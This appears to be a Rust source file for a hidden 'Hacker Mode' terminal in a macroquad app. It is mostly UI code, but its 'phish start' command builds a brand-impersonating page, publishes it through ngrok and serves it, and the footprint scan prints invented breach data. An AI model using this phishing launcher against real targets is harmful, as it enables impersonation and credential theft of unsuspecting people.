use macroquad::prelude::*;
use std::time::{Duration, Instant};
use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;
use ::rand::Rng;
use std::process::Command;
use tokio::runtime::Runtime;
use crate::modes::hackersmod::{ngrok, server, sitegen, webhook};
use serde::{Serialize, Deserialize};
use std::io::{self, Write};

static START_TIME: Lazy<Mutex<Option<Instant>>> = Lazy::new(|| Mutex::new(None));

#[derive(Debug, Serialize, Deserialize)]
pub struct UserInput {
    pub name: String,
    pub email: String,
    pub username: String,
    pub phone: Option<String>,
}

pub struct PhishingState {
    pub active: bool,
    pub brand: String,
    pub webhook_url: String,
    pub ngrok_url: Option<String>,
}

pub struct HackerMode {
    pub triggered: bool,
    terminal_lines: Vec<String>,
    current_line_index: usize,
    char_index: usize,
    input_buffer: String,
    last_typing_time: Instant,
    blink_on: bool,
    phishing: PhishingState,
    scroll_offset: f32,
    max_scroll: f32,
}

impl Default for HackerMode {
    fn default() -> Self {
        Self {
            triggered: false,
            terminal_lines: vec![],
            current_line_index: 0,
            char_index: 0,
            input_buffer: String::new(),
            last_typing_time: Instant::now(),
            blink_on: true,
            phishing: PhishingState {
                active: false,
                brand: String::new(),
                webhook_url: String::new(),
                ngrok_url: None,
            },
            scroll_offset: 0.0,
            max_scroll: 0.0,
        }
    }
}

impl HackerMode {
    pub fn update(&mut self) {
        if !self.triggered && is_key_pressed(KeyCode::G)
            && is_key_down(KeyCode::LeftControl)
            && is_key_down(KeyCode::LeftAlt) {
            self.trigger();
        }
    }

    pub fn trigger(&mut self) {
        self.triggered = true;
        self.terminal_lines = vec![
            "Booting Hacker Mode...".to_string(),
            "Loading modules:".to_string(),
            "- Phishing Toolkit".to_string(),
            "- Network Scanner".to_string(),
            "- Threat Analyzer".to_string(),
            "- Digital Footprint Scanner".to_string(),
            "System ready. Type 'help' for commands".to_string(),
        ];
        *START_TIME.lock().unwrap() = Some(Instant::now());
        self.last_typing_time = Instant::now();
    }

    pub fn draw_hacker_ui(&mut self) {
        clear_background(BLACK);

        if !self.triggered || self.terminal_lines.is_empty() {
            return;
        }

        // Calculate max scroll based on content height
        let content_height = self.terminal_lines.len() as f32 * 24.0;
        let visible_height = screen_height() - 100.0; // Account for input area
        self.max_scroll = (content_height - visible_height).max(0.0);

        // Handle scroll input
        if mouse_wheel().1 != 0.0 {
            self.scroll_offset = (self.scroll_offset - mouse_wheel().1 * 20.0)
                .clamp(0.0, self.max_scroll);
        }

        // Draw scroll bar if needed
        if self.max_scroll > 0.0 {
            let scroll_bar_width = 10.0;
            let scroll_bar_height = visible_height * (visible_height / content_height);
            let scroll_pos = (self.scroll_offset / self.max_scroll) * (visible_height - scroll_bar_height);
            
            draw_rectangle(
                screen_width() - scroll_bar_width - 5.0,
                5.0 + scroll_pos,
                scroll_bar_width,
                scroll_bar_height,
                Color::new(0.2, 0.8, 0.2, 0.5),
            );
        }

        // Render terminal text with scroll offset
        let mut y = 20.0 - self.scroll_offset;
        for (i, line) in self.terminal_lines.iter().enumerate() {
            if i <= self.current_line_index && y + 24.0 > 0.0 && y < screen_height() {
                let render_line = if i == self.current_line_index {
                    line.chars().take(self.char_index).collect::<String>()
                } else {
                    line.clone()
                };

                draw_text_ex(
                    &render_line,
                    20.0,
                    y,
                    TextParams {
                        font: None,
                        font_size: 20,
                        color: GREEN,
                        ..Default::default()
                    },
                );
            }
            y += 24.0;
        }

        // Update typing animation
        if self.last_typing_time.elapsed() >= Duration::from_millis(10) {
            if self.current_line_index < self.terminal_lines.len() {
                self.char_index += 1;
                if self.char_index > self.terminal_lines[self.current_line_index].len() {
                    self.current_line_index += 1;
                    self.char_index = 0;
                    if ::rand::thread_rng().gen_bool(0.1) {
                        self.terminal_lines.push("@##$%&*^GL!TCH~ERROR###".to_string());
                    }
                }
            }
            self.last_typing_time = Instant::now();
        }

        // Draw input prompt
        let input_y = screen_height() - 50.0;
        draw_line(20.0, input_y - 10.0, screen_width() - 20.0, input_y - 10.0, 1.0, GREEN);
        
        if self.last_typing_time.elapsed() >= Duration::from_millis(500) {
            self.blink_on = !self.blink_on;
            self.last_typing_time = Instant::now();
        }

        let cursor = if self.blink_on { "█" } else { " " };
        let prompt = format!("$ {}{}", self.input_buffer, cursor);
        draw_text_ex(
            &prompt,
            20.0,
            input_y,
            TextParams {
                font: None,
                font_size: 20,
                color: GREEN,
                ..Default::default()
            },
        );

        self.handle_input();
    }

    fn handle_input(&mut self) {
        while let Some(key) = get_char_pressed() {
            self.input_buffer.push(key);
        }

        if is_key_pressed(KeyCode::Backspace) {
            self.input_buffer.pop();
        }

        if is_key_pressed(KeyCode::Enter) {
            let input = self.input_buffer.trim().to_lowercase();
            self.process_command(&input);
            self.input_buffer.clear();
            // Auto-scroll to bottom when new command is entered
            self.scroll_offset = self.max_scroll;
        }
    }

    fn process_command(&mut self, input: &str) {
        self.terminal_lines.push(format!("$ {}", input));
        let parts: Vec<&str> = input.split_whitespace().collect();

        match parts.as_slice() {
            ["help"] => self.show_help(),
            ["clear"] => self.clear_terminal(),
            ["exit"] => self.exit_hacker_mode(),
            ["phish", "start", brand, business, ..] => self.start_phishing(brand, business, parts.get(2), parts.get(3)),
            ["phish", "stop"] => self.stop_phishing(),
            ["phish", "status"] => self.phishing_status(),
            ["check_browser", target] => self.scan_browser_extension(target),
            ["weak_ssids", ssid] => self.check_ssid_strength(ssid),
            ["footprint"] => self.run_footprint_scan(),
            _ => self.terminal_lines.push("Unknown command. Type 'help' for options".to_string()),
        }
    }

    fn show_help(&mut self) {
        self.terminal_lines.extend(vec![
            "Core Commands:".to_string(),
            "  phish start <brand> <business> [logo] [webhook]".to_string(),
            "  phish stop".to_string(),
            "  phish status".to_string(),
            "  check_browser <file>".to_string(),
            "  weak_ssids <ssid>".to_string(),
            "  footprint - Run digital footprint scan".to_string(),
            "  clear".to_string(),
            "  exit".to_string(),
        ]);
    }

    fn clear_terminal(&mut self) {
        self.terminal_lines.clear();
        self.current_line_index = 0;
        self.char_index = 0;
        self.scroll_offset = 0.0;
    }

    fn exit_hacker_mode(&mut self) {
        self.terminal_lines.push("Terminating all processes...".to_string());
        if self.phishing.active {
            self.stop_phishing();
        }
        self.triggered = false;
    }

    fn start_phishing(&mut self, brand: &str, business: &str, logo: Option<&&str>, webhook: Option<&&str>) {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            let html = sitegen::generate_html(brand, business, logo.unwrap_or(&""), "default");
            self.phishing.brand = brand.to_string();
            self.phishing.webhook_url = webhook.unwrap_or(&"").to_string();

            if let Some(url) = ngrok::start_ngrok().await {
                self.phishing.ngrok_url = Some(url.clone());
                self.terminal_lines.push(format!("🌐 Public URL: {}", url));
            }

            server::start_server(html).await;
        });

        self.phishing.active = true;
        self.terminal_lines.push(format!("🚀 Phishing campaign started for {}", brand));
    }

    fn stop_phishing(&mut self) {
        self.phishing.active = false;
        ngrok::stop_ngrok();
        self.phishing.ngrok_url = None;
        self.terminal_lines.push("🛑 Phishing stopped. Cleaned up files.".to_string());
    }

    fn phishing_status(&mut self) {
        self.terminal_lines.push("Phishing Status:".to_string());
        self.terminal_lines.push(format!("Active: {}", self.phishing.active));
        if let Some(url) = &self.phishing.ngrok_url {
            self.terminal_lines.push(format!("URL: {}", url));
        }
    }

    fn scan_browser_extension(&mut self, target: &str) {
        self.terminal_lines.push(format!("🔍 Scanning browser extension: {}", target));
        
        let output = Command::new("python")
            .arg("src/scripts/predict_extension.py")
            .arg(target)
            .output();

        match output {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                for line in stdout.lines() {
                    self.terminal_lines.push(line.to_string());
                }
            }
            Err(e) => {
                self.terminal_lines.push(format!("❌ Error: {}", e));
            }
        }
    }

    fn check_ssid_strength(&mut self, ssid: &str) {
        self.terminal_lines.push(format!("📶 Checking SSID strength: {}", ssid));
        
        let output = Command::new("python")
            .arg("src/scripts/predict_ssid.py")
            .arg(ssid)
            .output();

        match output {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                self.terminal_lines.push(stdout.trim().to_string());
            }
            Err(e) => {
                self.terminal_lines.push(format!("❌ Error: {}", e));
            }
        }
    }

    fn run_footprint_scan(&mut self) {
        self.terminal_lines.push("🔍 Starting Digital Footprint Scan...".to_string());
        
        // Simulate user input
        let user = UserInput {
            name: "John Doe".to_string(),
            email: "john.doe@example.com".to_string(),
            username: "johndoe".to_string(),
            phone: Some("+1234567890".to_string()),
        };

        self.terminal_lines.push("\n🛡️ Breach Lookup".to_string());
        self.terminal_lines.push(format!("Found 2 breaches for {}", user.email));
        self.terminal_lines.push("- AdobeLeak (2019): Email, Password".to_string());
        self.terminal_lines.push("- DataMonster (2021): Email, Name, Phone".to_string());

        self.terminal_lines.push("\n🌐 Social Media Presence".to_string());
        let platforms = vec!["GitHub", "Twitter", "Reddit", "Instagram"];
        for site in platforms {
            self.terminal_lines.push(format!(
                "- {}: https://{}.com/{}",
                site,
                site.to_lowercase(),
                user.username
            ));
        }

        self.terminal_lines.push("\n🕶️ Dark Web Watchlist".to_string());
        self.terminal_lines.push("⚠️ Match found in BlackBreach2023".to_string());
        self.terminal_lines.push("Leaked Credential Sample:".to_string());
        self.terminal_lines.push(format!("Email: {}", user.email));
        self.terminal_lines.push("Password Hash: 5f4dcc3b5aa765d61d8327deb882cf99 (md5)".to_string());

        self.terminal_lines.push("\n📊 Final Risk Score: 83/100".to_string());
    }
}